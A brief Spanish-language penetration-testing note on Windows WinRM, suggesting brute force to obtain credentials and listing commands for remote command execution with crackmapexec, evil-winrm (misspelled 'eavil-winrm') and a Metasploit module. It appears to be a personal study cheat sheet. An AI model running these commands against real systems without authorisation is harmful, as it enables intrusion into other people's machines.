### Enumeracion
Si ya tenemos algun usuario mucho mejor, sino podemos tratar de realizar un ataque de fuerza bruta.

![[Enumeracion#Enumerar usuarios Active Directory]]

### Ejecución de comandos
#### WinRM RCE crackmapexec
```bash
crackmapexec winrm <ip> -u <usuario> -p <pass> -x "Comando"
```

#### WinRM RCE evil-winrm
```bash
eavil-winrm -u <usuario> -p <pass> -i <ip>
```

#### WinRM RCE metasploit
```bash
use exploit/windows/winrm/winrm_script_exec
```

